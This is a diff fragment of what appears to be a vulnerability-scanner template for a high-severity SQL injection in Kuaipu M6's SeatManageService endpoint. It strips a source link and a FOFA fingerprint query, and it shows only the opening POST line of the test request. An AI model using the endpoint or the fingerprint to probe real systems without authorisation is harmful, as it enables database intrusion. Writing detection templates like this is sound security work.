@@ -3,12 +3,8 @@ info:
   name: 快普M6 SeatManageService 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ooru68lep46v9n6c'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ooru68lep46v9n6c
-    fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
 http:
 - raw:
   - 'POST /WebService/SeatManageService.asmx/GetCallInfo HTTP/1.1
